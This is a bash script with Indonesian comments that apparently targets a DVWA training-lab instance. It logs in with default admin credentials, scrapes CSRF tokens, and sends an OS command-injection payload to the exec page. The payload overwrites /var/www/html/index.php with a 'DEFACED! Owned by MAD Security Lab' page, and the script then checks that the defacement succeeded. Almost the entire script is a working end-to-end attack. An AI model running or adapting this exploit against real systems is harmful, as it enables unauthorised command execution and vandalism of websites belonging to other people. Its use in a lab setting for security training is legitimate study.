#!/bin/bash
# Jalankan: bash webdeface.sh

BASE_URL="https://dvwa-nowaf.csalab.app"
USERNAME="admin"
PASSWORD="password"
COOKIES="/tmp/dvwa-cookies.txt"

# Login
rm -f "$COOKIES"
TOKEN=$(curl -s -c "$COOKIES" "$BASE_URL/login.php" | grep -oE "user_token' value='[a-f0-9]+" | grep -oE "[a-f0-9]{20,}")
curl -s -b "$COOKIES" -c "$COOKIES" -X POST "$BASE_URL/login.php" \
  --data-urlencode "username=$USERNAME" \
  --data-urlencode "password=$PASSWORD" \
  --data-urlencode "user_token=$TOKEN" \
  --data-urlencode "Login=Login" -o /dev/null

# Ambil token halaman exec
EXEC_TOKEN=$(curl -s -b "$COOKIES" -c "$COOKIES" "$BASE_URL/vulnerabilities/exec/" | grep -oE "user_token' value='[a-f0-9]+" | grep -oE "[a-f0-9]{20,}")

# Kirim payload deface
echo "Attack start: $(date -u '+%Y-%m-%d %H:%M:%S') UTC"
curl -s -b "$COOKIES" -X POST "$BASE_URL/vulnerabilities/exec/" \
  --data-urlencode "ip=127.0.0.1 && echo '<!DOCTYPE html><html><head><title>Hacked by MAD</title><style>body{background:black;color:red;text-align:center;font-family:monospace;}h1{font-size:60px;margin-top:100px;}p{font-size:20px;}img{margin-top:30px;border:3px solid red;}</style></head><body><h1>DEFACED!</h1><p>Owned by MAD Security Lab</p><img src=\"https://upload.wikimedia.org/wikipedia/commons/a/a6/Anonymous_emblem.svg\" width=\"300\"></body></html>' > /var/www/html/index.php" \
  --data-urlencode "user_token=$EXEC_TOKEN" \
  --data-urlencode "Submit=Submit" -o /dev/null
echo "Attack end: $(date -u '+%Y-%m-%d %H:%M:%S') UTC"

# Verifikasi
sleep 2
curl -s "$BASE_URL/index.php" | grep -q "DEFACED" && echo "Result: DEFACED (verified)" || echo "Result: NOT verified, cek manual"
